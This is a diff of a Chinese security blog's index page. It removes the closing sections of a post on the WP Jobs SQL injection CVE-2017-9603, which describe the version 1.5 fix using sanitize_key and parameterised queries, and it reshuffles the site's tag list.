-<h3 id="0x05-修复方案"><a href="#0x05-修复方案" class="headerlink" title="0x05 修复方案"></a>0x05 修复方案</h3><p>修复的常见套路就是将<code>WP Jobs</code>更新到最新的可用版本即可。</p>
-<p>我们详细查看下，官方是如何修复此次的漏洞的。然后下载了<code>WP Jobs 1.5</code>。</p>
-<p>在1.5版本中使用了<code>sanitize_key</code>函数对参数进行过滤，使<code>jobid</code>参数只允许包含数字，字母，破折号和下划线。<code>jobid</code>参数不在使用拼接的方式，而是使用参数化。</p>
-<img src="/2017/09/18/CVE-2017-9603-分析/2.png" alt="ByPupil" title="ByPupil">
-<img src="/2017/09/18/CVE-2017-9603-分析/3.png" alt="Bypupil" title="Bypupil">
-<h3 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h3><p>个人觉得这个漏洞很鸡肋，必须要登录到后台才能够进行SQL注入。只要花时间，CVE其实并没有想象中那么难拿。┑(￣▽ ￣)┍</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">code audit</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/09/18/CVE-2017-9603-分析/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -1290,19 +1257,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">code audit</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Windows工具</a>
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Windows工具</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1314,7 +1281,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">神器</a>
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1322,7 +1289,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+                <a href="javascript:void(0)" class="js-tag color4">树莓派</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">神器</a>
               </li>
             
             <div class="clearfix"></div>
